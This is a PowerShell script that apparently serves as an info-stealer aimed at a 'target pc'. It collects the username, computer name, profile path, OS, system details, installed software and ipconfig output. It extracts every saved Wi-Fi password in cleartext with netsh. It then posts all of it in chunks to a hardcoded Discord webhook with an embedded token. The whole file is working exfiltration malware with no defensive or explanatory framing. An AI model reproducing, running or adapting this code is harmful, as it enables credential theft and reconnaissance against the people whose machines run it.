function Send-DiscordWebhook {
    param (
        [string]$WebhookUrl,
        [string]$Content
    )

    # Set the maximum chunk size (adjust as needed)
    $maxChunkSize = 2000

    # Split the content into chunks
    $contentChunks = $Content -split "(?s)(.{$maxChunkSize})"
    
    foreach ($chunk in $contentChunks) {
        # Create a PowerShell object with the content using the variable
        $payloadObject = @{
            content = $chunk
        }

        try {
            # Set the TLS version
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

            # Send the request to the Discord webhook
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($payloadObject | ConvertTo-Json -Depth 5) -ContentType "application/json"
        }
        catch {
            Write-Host "Error: $_"
        }
    }
}

# Get info about target pc
$ip = Invoke-Expression 'ipconfig' | Out-String
$ipv4Address = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
$wifi = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" } | ForEach-Object { netsh wlan show profiles $_ key=clear | Select-String "SSID name", "Key Content" }) -join "`n"
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$software = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion)
$computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-String

$data = "Username: " + $env:USERNAME + "`nComputer name: " + $env:COMPUTERNAME + "`nDisc location: " + $env:USERPROFILE + "`nComputer system: " + $computerSystem + "`nOS: " + $os + "`n`n`nIPv4: " + $ipv4Address + "`nMore IP info: " + $ip + "`nWifi password(s):`n" + $wifi

# Set the Discord webhook URL
$webhookUrl = "https://discordapp.com/api/webhooks/1199979603293388810/GVsXlbrSlcpgPr8paE-pP2GEnmlCJ5KruxNY1KdJG6p2AYPc9p7Ybtg3lQf9etEzq1xy"

# Send the request to the Discord webhook (split into chunks)
Send-DiscordWebhook -WebhookUrl $webhookUrl -Content $data
